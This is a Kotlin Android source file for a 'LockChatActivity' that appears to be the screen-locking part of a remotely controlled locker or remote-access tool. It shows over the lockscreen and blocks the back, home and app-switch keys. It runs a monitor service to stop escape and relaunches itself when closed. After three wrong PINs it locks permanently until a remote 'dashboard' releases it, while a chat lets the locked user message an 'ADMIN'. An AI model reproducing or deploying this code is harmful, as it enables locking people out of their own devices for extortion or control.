package com.sync.xxx

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.PixelFormat
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.Gravity
import android.view.KeyEvent
import android.view.View
import android.view.WindowManager
import android.view.inputmethod.InputMethodManager
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

class LockChatActivity : AppCompatActivity() {

    private lateinit var chatRecycler: RecyclerView
    private lateinit var messageInput: EditText
    private lateinit var sendButton: Button
    private lateinit var pinInput: EditText
    private lateinit var unlockButton: Button
    private lateinit var attemptsLabel: TextView
    
    private val messages = mutableListOf<ChatMessage>()
    private lateinit var adapter: ChatAdapter
    
    private var correctPin = "1234" // Default PIN
    private var wrongAttempts = 0
    private var isLocked = false
    private var countdownActive = false
    
    // System Overlay variables
    private var overlayView: View? = null
    private var windowManager: WindowManager? = null
    
    private val messageReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            when (intent.action) {
                ACTION_MESSAGE_FROM_DASHBOARD -> {
                    val message = intent.getStringExtra(EXTRA_MESSAGE) ?: return
                    addMessage(message, MessageType.ADMIN)
                }
                "com.sync.xxx.LOCKCHAT_CLOSE" -> {
                    // Stop monitor service FIRST before closing
                    val stopIntent = Intent(context, LockMonitorService::class.java).apply {
                        action = LockMonitorService.ACTION_STOP_MONITORING
                    }
                    context.stopService(stopIntent)
                    
                    // Remove overlay
                    removeOverlay()
                    
                    // Wait then finish
                    Handler(Looper.getMainLooper()).postDelayed({
                        finish()
                    }, 1500)
                }
                "com.sync.xxx.LOCKCHAT_UNLOCK_PERMANENT" -> {
                    // Reset lock permanen dari dashboard
                    isLocked = false
                    wrongAttempts = 0
                    countdownActive = false
                    pinInput.isEnabled = true
                    unlockButton.isEnabled = true
                    pinInput.alpha = 1.0f
                    unlockButton.alpha = 1.0f
                    addMessage("🔓 Lock permanen di-reset oleh dashboard. Silakan masukkan PIN.", MessageType.ADMIN)
                }
            }
        }
    }

    companion object {
        const val ACTION_MESSAGE_FROM_DASHBOARD = "com.sync.xxx.LOCKCHAT_MESSAGE"
        const val EXTRA_MESSAGE = "message"
        const val EXTRA_TITLE = "title"
        const val EXTRA_PIN = "pin"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Fullscreen + show on lockscreen
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true)
            setTurnScreenOn(true)
        } else {
            @Suppress("DEPRECATION")
            window.addFlags(
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
            )
        }
        
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        
        // Hide navigation bar + immersive mode (hard lock)
        @Suppress("DEPRECATION")
        window.decorView.systemUiVisibility = (
            View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
            or View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
            or View.SYSTEM_UI_FLAG_FULLSCREEN
            or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
            or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
        )
        
        // Disable back button for Android 13+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            onBackInvokedDispatcher.registerOnBackInvokedCallback(
                1000000 // Highest priority
            ) {
                // Do nothing - block back button
            }
        }
        
        setContentView(R.layout.activity_lock_chat)
        
        // DISABLE overlay - malah block Lock Chat sendiri
        // createOverlay()
        
        // Get extras
        val title = intent.getStringExtra(EXTRA_TITLE) ?: "LOCKED"
        correctPin = intent.getStringExtra(EXTRA_PIN) ?: "1234"
        
        // Start monitor service to prevent escape
        val serviceIntent = Intent(this, LockMonitorService::class.java).apply {
            putExtra(LockMonitorService.EXTRA_PIN, correctPin)
            putExtra(LockMonitorService.EXTRA_TITLE, title)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
        // Setup views
        findViewById<TextView>(R.id.lockTitle).text = title
        
        chatRecycler = findViewById(R.id.chatRecycler)
        messageInput = findViewById(R.id.messageInput)
        sendButton = findViewById(R.id.sendButton)
        pinInput = findViewById(R.id.pinInput)
        unlockButton = findViewById(R.id.unlockButton)
        
        // Setup RecyclerView
        adapter = ChatAdapter(messages)
        chatRecycler.adapter = adapter
        chatRecycler.layoutManager = LinearLayoutManager(this).apply {
            stackFromEnd = true
        }
        
        // Register receiver for messages and close command
        val filter = IntentFilter().apply {
            addAction(ACTION_MESSAGE_FROM_DASHBOARD)
            addAction("com.sync.xxx.LOCKCHAT_CLOSE")
            addAction("com.sync.xxx.LOCKCHAT_UNLOCK_PERMANENT")
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(messageReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(messageReceiver, filter)
        }
        
        // Setup listeners
        sendButton.setOnClickListener {
            sendMessage()
        }
        
        messageInput.setOnKeyListener { _, keyCode, event ->
            if (keyCode == KeyEvent.KEYCODE_ENTER && event.action == KeyEvent.ACTION_DOWN) {
                sendMessage()
                return@setOnKeyListener true
            }
            false
        }
        
        unlockButton.setOnClickListener {
            tryUnlock()
        }
        
        pinInput.setOnKeyListener { _, keyCode, event ->
            if (keyCode == KeyEvent.KEYCODE_ENTER && event.action == KeyEvent.ACTION_DOWN) {
                tryUnlock()
                return@setOnKeyListener true
            }
            false
        }
        
        // Welcome messages
        Handler(Looper.getMainLooper()).postDelayed({
            addMessage("Perangkat ini telah dikunci oleh administrator.", MessageType.ADMIN)
        }, 500)
        
        Handler(Looper.getMainLooper()).postDelayed({
            addMessage("Kirim pesan atau masukkan PIN untuk membuka kunci.", MessageType.ADMIN)
        }, 1200)
        
        // Auto-show keyboard after delay
        Handler(Looper.getMainLooper()).postDelayed({
            messageInput.requestFocus()
            val imm = getSystemService(Context.INPUT_METHOD_SERVICE) as? InputMethodManager
            imm?.showSoftInput(messageInput, InputMethodManager.SHOW_IMPLICIT)
        }, 300)
    }

    private fun sendMessage() {
        val text = messageInput.text.toString().trim()
        if (text.isEmpty()) return
        
        addMessage(text, MessageType.USER)
        messageInput.setText("")
        
        // Send to dashboard via DeviceService
        val intent = Intent(DeviceService.ACTION_COMMAND).apply {
            putExtra(DeviceService.EXTRA_COMMAND, "lockChatSend")
            putExtra(DeviceService.EXTRA_VALUE, text)
            setPackage(packageName)
        }
        sendBroadcast(intent)
    }

    private fun tryUnlock() {
        // Check if permanently locked
        if (isLocked) {
            addMessage("🔒 LOCK PERMANEN! PIN dinonaktifkan. Hanya bisa unlock dari dashboard.", MessageType.ADMIN)
            return
        }
        
        // Check if countdown active
        if (countdownActive) {
            addMessage("⏳ Tunggu countdown selesai!", MessageType.ADMIN)
            return
        }
        
        val pin = pinInput.text.toString().trim()
        
        if (pin.isEmpty()) {
            addMessage("❌ Masukkan PIN terlebih dahulu!", MessageType.ADMIN)
            return
        }
        
        if (pin == correctPin) {
            // PIN BENAR - Unlock
            addMessage("🔓 PIN BENAR! Perangkat dibuka...", MessageType.ADMIN)
            wrongAttempts = 0
            
            // Stop monitor service FIRST
            val stopIntent = Intent(this, LockMonitorService::class.java).apply {
                action = LockMonitorService.ACTION_STOP_MONITORING
            }
            stopService(stopIntent)
            
            // Remove overlay
            removeOverlay()
            
            // Wait for service to stop before finishing
            Handler(Looper.getMainLooper()).postDelayed({
                finish()
            }, 1500)
        } else {
            // PIN SALAH
            wrongAttempts++
            pinInput.setText("")
            
            val attemptsLeft = 3 - wrongAttempts
            
            if (wrongAttempts >= 3) {
                // LOCK PERMANEN setelah 3x salah
                isLocked = true
                pinInput.isEnabled = false
                unlockButton.isEnabled = false
                pinInput.alpha = 0.5f
                unlockButton.alpha = 0.5f
                
                addMessage("🚫 LOCK PERMANEN! PIN salah 3x. Hanya bisa unlock dari dashboard.", MessageType.ADMIN)
            } else {
                // Masih ada attempts
                addMessage("❌ PIN SALAH! Sisa percobaan: $attemptsLeft", MessageType.ADMIN)
                
                // Start countdown 10 detik
                startCountdown(10)
            }
            
            // Shake animation
            pinInput.animate()
                .translationX(-20f)
                .setDuration(50)
                .withEndAction {
                    pinInput.animate()
                        .translationX(20f)
                        .setDuration(50)
                        .withEndAction {
                            pinInput.animate()
                                .translationX(0f)
                                .setDuration(50)
                                .start()
                        }
                        .start()
                }
                .start()
        }
    }
    
    private fun startCountdown(seconds: Int) {
        countdownActive = true
        pinInput.isEnabled = false
        unlockButton.isEnabled = false
        pinInput.alpha = 0.5f
        unlockButton.alpha = 0.5f
        
        var remaining = seconds
        
        val countdownRunnable = object : Runnable {
            override fun run() {
                if (remaining > 0) {
                    addMessage("⏳ Tunggu $remaining detik...", MessageType.ADMIN)
                    remaining--
                    Handler(Looper.getMainLooper()).postDelayed(this, 1000)
                } else {
                    // Countdown selesai
                    countdownActive = false
                    if (!isLocked) {
                        pinInput.isEnabled = true
                        unlockButton.isEnabled = true
                        pinInput.alpha = 1.0f
                        unlockButton.alpha = 1.0f
                    }
                    addMessage("✅ Countdown selesai. Silakan coba lagi.", MessageType.ADMIN)
                }
            }
        }
        
        Handler(Looper.getMainLooper()).post(countdownRunnable)
    }

    private fun addMessage(text: String, type: MessageType) {
        val time = SimpleDateFormat("HH:mm", Locale.getDefault()).format(Date())
        messages.add(ChatMessage(text, type, time))
        adapter.notifyItemInserted(messages.size - 1)
        chatRecycler.scrollToPosition(messages.size - 1)
    }

    override fun onResume() {
        super.onResume()
        // Re-apply immersive mode setiap resume
        applyImmersiveMode()
    }
    
    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)
        if (hasFocus) {
            // Re-apply immersive mode setiap dapat focus
            applyImmersiveMode()
        }
    }
    
    private fun applyImmersiveMode() {
        @Suppress("DEPRECATION")
        window.decorView.systemUiVisibility = (
            View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
            or View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
            or View.SYSTEM_UI_FLAG_FULLSCREEN
            or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
            or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
        )
    }
    
    override fun onDestroy() {
        super.onDestroy()
        
        // Remove overlay if exists
        removeOverlay()
        
        try {
            unregisterReceiver(messageReceiver)
        } catch (_: Exception) {}
        
        // Auto-restart if not unlocked properly
        if (!isFinishing) {
            Handler(Looper.getMainLooper()).postDelayed({
                startActivity(Intent(this, LockChatActivity::class.java).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP
                    putExtra(EXTRA_TITLE, "LOCKED")
                    putExtra(EXTRA_PIN, correctPin)
                })
            }, 100)
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        // Remove overlay before blocking (prevent freeze)
        removeOverlay()
        
        // Block back button - do nothing
        // Activity should stay open
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        // Disable home button + recent apps
        return when (keyCode) {
            KeyEvent.KEYCODE_HOME, 
            KeyEvent.KEYCODE_APP_SWITCH -> true
            else -> super.onKeyDown(keyCode, event)
        }
    }
    
    private fun createOverlay() {
        try {
            // Check overlay permission
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (!Settings.canDrawOverlays(this)) {
                    // Request permission (optional - bisa skip kalau mau auto-grant)
                    android.util.Log.w("LockChatActivity", "Overlay permission not granted")
                    // Lanjut aja tanpa overlay, masih ada immersive mode
                    return
                }
            }
            
            windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            
            // Create transparent blocking overlay
            overlayView = View(this).apply {
                setBackgroundColor(android.graphics.Color.TRANSPARENT)
                
                // Intercept all touch events
                setOnTouchListener { _, _ -> true }
            }
            
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                } else {
                    @Suppress("DEPRECATION")
                    WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
                },
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT
            )
            
            params.gravity = Gravity.TOP or Gravity.START
            
            windowManager?.addView(overlayView, params)
            android.util.Log.d("LockChatActivity", "Overlay created successfully")
        } catch (e: Exception) {
            android.util.Log.e("LockChatActivity", "Failed to create overlay: ${e.message}")
        }
    }
    
    private fun removeOverlay() {
        try {
            overlayView?.let {
                windowManager?.removeView(it)
                overlayView = null
                android.util.Log.d("LockChatActivity", "Overlay removed successfully")
            }
        } catch (e: Exception) {
            android.util.Log.e("LockChatActivity", "Failed to remove overlay: ${e.message}")
        }
    }
    
}

// Data class
data class ChatMessage(
    val text: String,
    val type: MessageType,
    val time: String
)

enum class MessageType {
    ADMIN, USER
}

// Adapter
class ChatAdapter(private val messages: List<ChatMessage>) : 
    RecyclerView.Adapter<ChatAdapter.ViewHolder>() {

    class ViewHolder(view: View) : RecyclerView.ViewHolder(view) {
        val container: LinearLayout = view.findViewById(R.id.messageContainer)
        val nameLabel: TextView = view.findViewById(R.id.nameLabel)
        val messageText: TextView = view.findViewById(R.id.messageText)
        val timeLabel: TextView = view.findViewById(R.id.timeLabel)
    }

    override fun onCreateViewHolder(parent: android.view.ViewGroup, viewType: Int): ViewHolder {
        val view = android.view.LayoutInflater.from(parent.context)
            .inflate(R.layout.item_chat_message, parent, false)
        return ViewHolder(view)
    }

    override fun onBindViewHolder(holder: ViewHolder, position: Int) {
        val msg = messages[position]
        
        holder.nameLabel.text = if (msg.type == MessageType.ADMIN) "● ADMIN" else "● KAMU"
        holder.messageText.text = msg.text
        holder.timeLabel.text = msg.time
        
        val layoutParams = holder.container.layoutParams as android.widget.FrameLayout.LayoutParams
        
        if (msg.type == MessageType.ADMIN) {
            layoutParams.gravity = android.view.Gravity.START
            holder.container.setBackgroundResource(R.drawable.bg_bubble_admin)
            holder.nameLabel.setTextColor(android.graphics.Color.parseColor("#dc2626"))
        } else {
            layoutParams.gravity = android.view.Gravity.END
            holder.container.setBackgroundResource(R.drawable.bg_bubble_user)
            holder.nameLabel.setTextColor(android.graphics.Color.parseColor("#ef4444"))
        }
        
        holder.container.layoutParams = layoutParams
    }

    override fun getItemCount() = messages.size
}
